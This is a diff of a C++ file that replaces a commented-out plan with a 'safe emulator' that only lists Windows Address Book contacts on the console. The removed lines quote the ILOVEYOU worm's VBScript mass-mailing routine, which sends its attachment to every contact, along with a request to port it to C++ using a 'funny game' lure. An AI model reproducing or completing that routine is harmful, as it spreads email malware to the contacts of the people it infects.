@@ -1,83 +1,327 @@
+// DisplayContacts.cpp
 #define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
 
 #include <windows.h>
+#include <iostream>
+#include <string>
 
-/*
-* TODO: Implement this email sending logic in c++
+#include <objbase.h>
+#include <unknwn.h>
 
-rem Subroutine to send emails to the user's contacts through MAPI
-rem (Messaging Application Programming Interface), the API used by Outlook to
-rem communicate with the Microsoft Exchange Server which also hosts calendars
-rem and address book.
-Sub spreadtoemail()
-  On Error Resume Next
-  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
+#include <mapix.h>
+#include <mapidefs.h>
+#include <mapi.h>
 
-  rem Creates a shell to edit the registry.
-  Set regedit = CreateObject("WScript.Shell")
-  rem Creates a new Outlook application object instance, to access the MAPI.
-  Set out = WScript.CreateObject("Outlook.Application")
-  rem Gets the MAPI namespace used to access the address book lists.
-  Set mapi = out.GetNameSpace("MAPI")
+#include <wabapi.h>
+#include <wabdefs.h>
+#include <wabiab.h>
 
-  rem Goes through all contacts in the address book and sends an email
-  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
-  For ctrlists = 1 To mapi.AddressLists.Count
-    Set a = mapi.AddressLists(ctrlists)
-    x = 1
-    rem Gets a registry key that is used to check who has been sent an email,
-    rem already to ensure that even if there may be duplicate contacts, it will
-    rem only send the email once to the same address.
-    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
+#include <iostream>
+#include <string>
 
-    If (regv = "") Then
-      regv = 1
-    End If
+#pragma comment(lib, "MAPI32.lib")
+#pragma comment(lib, "ole32.lib")
 
-    If (int(a.AddressEntries.Count) > int(regv)) Then
-      rem Iterates over each entry in the address list.
-      For ctrentries = 1 To a.AddressEntries.Count
-        malead = a.AddressEntries(x)
-        regad = ""
-        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )
+namespace ILOVEYOUSafeEmulator
+{
+    // ------------------------------------------------------------
+    // Enumerates contacts ONLY for console display.
+    //
+    // This function does NOT:
+    //   - send mail
+    //   - modify contacts
+    //   - save contacts
+    //   - build a recipient list
+    // ------------------------------------------------------------
+    void DisplayContacts()
+    {
+        HMODULE hWab = LoadLibraryW(L"wab32.dll");
 
-        rem If the contact hasn't yet been sent an email, a new email will be
-        rem composed with the virus attached and a "kind" message and the
-        rem subject "ILOVEYOU".
-        If (regad = "") Then
-          Set male = out.CreateItem(0)
+        if (!hWab)
+        {
+            std::wcout << L"[!] Windows Address Book is unavailable.\n";
+            return;
+        }
 
-          male.Recipients.Add(malead)
-          male.Subject = "ILOVEYOU"
-          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
-          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
-          male.Send
+        using WABOpenFn = HRESULT(WINAPI*)(
+            LPADRBOOK*,
+            LPWABOBJECT*,
+            LPWAB_PARAM,
+            DWORD
+            );
 
-          rem Sets the registry key to indicate that the email has been sent
-          rem to the current contact.
-          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
-        End If
+        auto WABOpen =
+            reinterpret_cast<WABOpenFn>(
+                GetProcAddress(hWab, "WABOpen"));
 
-        x = x + 1
-      Next
+        if (!WABOpen)
+        {
+            std::wcout << L"[!] WABOpen was not found.\n";
+            FreeLibrary(hWab);
+            return;
+        }
 
-      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
-    Else
-      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
-    End If
-  Next
+        LPADRBOOK addressBook = nullptr;
+        LPWABOBJECT wabObject = nullptr;
 
-  Set out = Nothing
-  Set mapi = Nothing
-End Sub
+        HRESULT hr = WABOpen(
+            &addressBook,
+            &wabObject,
+            nullptr,
+            0
+        );
 
-- this should include the executable on the email's body and be on this style:
-Title: Hey! Check out this funny game!
-Body: Its an online game about catching bugs and displaying them on your collection!
-      If you have some spare time, go play with me!
-*/
+        if (FAILED(hr))
+        {
+            std::wcout << L"[!] Could not open the address book.\n";
+            FreeLibrary(hWab);
+            return;
+        }
 
-namespace EmailsAndShit {
-    // TODO: functions to do that in steps
+        std::wcout << L"\n=== Local Address Book ===\n\n";
+
+        /*
+         * The WAB/MAPI address-book interfaces expose containers
+         * and their contents through MAPI tables.
+         *
+         * The exact provider available on the machine determines
+         * which contacts can be enumerated.
+         */
+
+        ULONG pabEntryIdSize = 0;
+        LPENTRYID pabEntryId = nullptr;
+
+        hr = addressBook->GetPAB(
+            &pabEntryIdSize,
+            &pabEntryId
+        );
+
+        if (FAILED(hr))
+        {
+            std::wcout << L"[!] Could not obtain the default address book.\n";
+
+            if (wabObject)
+                wabObject->Release();
+
+            if (addressBook)
+                addressBook->Release();
+
+            FreeLibrary(hWab);
+            return;
+        }
+
+        IABContainer* container = nullptr;
+
+        hr = addressBook->OpenEntry(
+            pabEntryIdSize,
+            pabEntryId,
+            nullptr,
+            0,
+            nullptr,
+            reinterpret_cast<LPUNKNOWN*>(&container)
+        );
+
+        if (FAILED(hr) || !container)
+        {
+            std::wcout << L"[!] Could not open the address-book container.\n";
+
+            if (pabEntryId)
+                wabObject->FreeBuffer(pabEntryId);
+
+            if (wabObject)
+                wabObject->Release();
+
+            if (addressBook)
+                addressBook->Release();
+
+            FreeLibrary(hWab);
+            return;
+        }
+
+        IMAPITable* table = nullptr;
+
+        hr = container->GetContentsTable(
+            0,
+            &table
+        );
+
+        if (FAILED(hr) || !table)
+        {
+            std::wcout << L"[!] Could not obtain the contacts table.\n";
+
+            container->Release();
+
+            if (pabEntryId)
+                wabObject->FreeBuffer(pabEntryId);
+
+            if (wabObject)
+                wabObject->Release();
+
+            if (addressBook)
+                addressBook->Release();
+
+            FreeLibrary(hWab);
+            return;
+        }
+
+        // Request only properties needed for display.
+        enum
+        {
+            DISPLAY_NAME = 0,
+            EMAIL_ADDRESS
+        };
+
+        SizedSPropTagArray(
+            2,
+            columns
+        ) =
+        {
+            2,
+            {
+                PR_DISPLAY_NAME,
+                PR_EMAIL_ADDRESS
+            }
+        };
+
+        hr = table->SetColumns(
+            reinterpret_cast<LPSPropTagArray>(&columns),
+            0
+        );
+
+        if (SUCCEEDED(hr))
+        {
+            ULONG count = 0;
+
+            while (true)
+            {
+                LPSRowSet rows = nullptr;
+
+                hr = table->QueryRows(
+                    1,
+                    0,
+                    &rows
+                );
+
+                if (FAILED(hr) ||
+                    !rows ||
+                    rows->cRows == 0)
+                {
+                    if (rows)
+                        MAPIFreeBuffer(rows);//FreeProws(rows);
+
+                    break;
+                }
+
+                SRow& row = rows->aRow[0];
+
+                std::wstring name = L"(unknown)";
+                std::wstring email = L"(no email)";
+
+                if (row.cValues >= 1)
+                {
+                    const SPropValue& p = row.lpProps[DISPLAY_NAME];
+
+                    if (p.ulPropTag == PR_DISPLAY_NAME &&
+                        p.Value.LPSZ)
+                    {
+#ifdef UNICODE
+                        name = p.Value.LPSZ;
+#else
+                        // WAB can expose ANSI data depending on provider.
+                        int len = MultiByteToWideChar(
+                            CP_ACP,
+                            0,
+                            p.Value.LPSZ,
+                            -1,
+                            nullptr,
+                            0
+                        );
+
+                        if (len > 0)
+                        {
+                            std::wstring converted(len - 1, L'\0');
+
+                            MultiByteToWideChar(
+                                CP_ACP,
+                                0,
+                                p.Value.LPSZ,
+                                -1,
+                                converted.data(),
+                                len
+                            );
+
+                            name = converted;
+                        }
+#endif
+                    }
+                }
+
+                if (row.cValues >= 2)
+                {
+                    const SPropValue& p = row.lpProps[EMAIL_ADDRESS];
+
+                    if (p.ulPropTag == PR_EMAIL_ADDRESS &&
+                        p.Value.LPSZ)
+                    {
+#ifdef UNICODE
+                        email = p.Value.LPSZ;
+#else
+                        int len = MultiByteToWideChar(
+                            CP_ACP,
+                            0,
+                            p.Value.LPSZ,
+                            -1,
+                            nullptr,
+                            0
+                        );
+
+                        if (len > 0)
+                        {
+                            std::wstring converted(len - 1, L'\0');
+
+                            MultiByteToWideChar(
+                                CP_ACP,
+                                0,
+                                p.Value.LPSZ,
+                                -1,
+                                converted.data(),
+                                len
+                            );
+
+                            email = converted;
+                        }
+#endif
+                    }
+                }
+
+                std::wcout
+                    << L"[" << count++ << L"] "
+                    << name
+                    << L" <"
+                    << email
+                    << L">\n";
+
+                MAPIFreeBuffer(rows);//FreeProws(rows);
+            }
+
+            std::wcout << L"\nTotal displayed: "
+                << count
+                << L"\n";
+        }
+
+        table->Release();
+        container->Release();
+
+        if (pabEntryId)
+            wabObject->FreeBuffer(pabEntryId);
+
+        if (wabObject)
+            wabObject->Release();
+
+        if (addressBook)
+            addressBook->Release();
+
+        FreeLibrary(hWab);
+    }
 }
